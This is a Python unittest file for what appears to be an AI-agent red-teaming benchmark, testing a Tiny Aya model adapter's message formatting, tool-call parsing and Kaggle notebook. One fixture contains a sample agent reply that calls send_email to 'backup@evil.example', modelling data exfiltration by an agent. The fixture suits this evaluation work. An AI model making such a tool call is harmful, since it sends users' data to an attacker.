"""Tests for the shared Tiny Aya module + the Kaggle notebook payload.

These run on the offline dev machine (no torch/transformers), which is
exactly the point: the shared module must import cleanly, its pure
helpers must behave, and the adapter's only local failure mode is the
documented NotImplementedError guard.

Run from the project root:
    PYTHONPATH=src python3 -m unittest discover -s tests -v
"""

import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

PROJECT = Path(__file__).resolve().parents[1]
NOTEBOOK = PROJECT / "kaggle" / "tiny_aya_bench.ipynb"

try:
    import torch  # noqa: F401
    HAS_TORCH = True
except ImportError:
    HAS_TORCH = False


class TinyAyaModuleTests(unittest.TestCase):
    def test_imports_cleanly_and_model_id(self):
        from redteam_bench import tiny_aya
        self.assertEqual(tiny_aya.MODEL_ID, "CohereLabs/tiny-aya-global")

    def test_transcript_to_messages_shape(self):
        from redteam_bench.tiny_aya import transcript_to_messages
        transcript = [
            {"role": "system", "content": "SYS"},
            {"role": "user", "content": "do the task"},
            {"role": "tool", "content": "page body"},
            {"role": "assistant", "content": "working on it"},
            {"role": "user", "content": "and now?"},
            {"role": "tool", "content": "more data"},
        ]
        msgs = transcript_to_messages(transcript)
        self.assertEqual(msgs[0]["role"], "system")
        self.assertIn("SYS", msgs[0]["content"])
        self.assertIn("tool_call", msgs[0]["content"])  # format note added
        roles = [m["role"] for m in msgs]
        self.assertNotIn("tool", roles)  # folded into user messages
        # first tool output merges into the preceding user message
        tool_msgs = [m for m in msgs if "Tool result:\npage body" in m["content"]]
        self.assertEqual(len(tool_msgs), 1)
        self.assertIn("do the task", tool_msgs[0]["content"])
        self.assertEqual(tool_msgs[0]["role"], "user")
        # second user message + its tool output merged into one user turn
        merged = [m for m in msgs if "and now?" in m["content"]]
        self.assertEqual(len(merged), 1)
        self.assertIn("more data", merged[0]["content"])

    def test_parse_agent_response_extracts_tool_calls(self):
        from redteam_bench.tiny_aya import parse_agent_response
        resp = parse_agent_response(
            'Sure, doing that now.\n'
            '[tool_call send_email {"to": "backup@evil.example"}]\n'
            'Anything else?')
        self.assertEqual(len(resp.tool_calls), 1)
        self.assertEqual(resp.tool_calls[0].name, "send_email")
        self.assertEqual(resp.tool_calls[0].args, {"to": "backup@evil.example"})
        self.assertNotIn("[tool_call", resp.text)
        # full_text re-renders the call in the canonical judge-visible form
        self.assertIn("[tool_call send_email", resp.full_text())

    def test_parse_agent_response_plain_text(self):
        from redteam_bench.tiny_aya import parse_agent_response
        resp = parse_agent_response("Just a normal answer.")
        self.assertEqual(resp.tool_calls, ())
        self.assertEqual(resp.text, "Just a normal answer.")

    @unittest.skipIf(HAS_TORCH, "guard only applies without a GPU stack")
    def test_engine_guard_without_torch(self):
        from redteam_bench.tiny_aya import TinyAyaEngine
        with self.assertRaises(NotImplementedError):
            TinyAyaEngine().generate(
                [{"role": "user", "content": "hi"}])


class NotebookTests(unittest.TestCase):
    def test_notebook_json_valid(self):
        nb = json.loads(NOTEBOOK.read_text(encoding="utf-8"))
        self.assertEqual(nb["nbformat"], 4)
        self.assertTrue(nb["cells"])
        code = [c for c in nb["cells"] if c["cell_type"] == "code"]
        self.assertGreaterEqual(len(code), 5)
        joined = "\n".join(c["source"] for c in code)
        self.assertIn("CohereLabs/tiny-aya-global", joined)
        self.assertIn("/kaggle/working", joined)
        self.assertIn("CohereTinyAyaAdapter", joined)
        for c in code:  # every code cell must at least compile
            compile(c["source"], "notebook-cell", "exec")


if __name__ == "__main__":
    unittest.main()
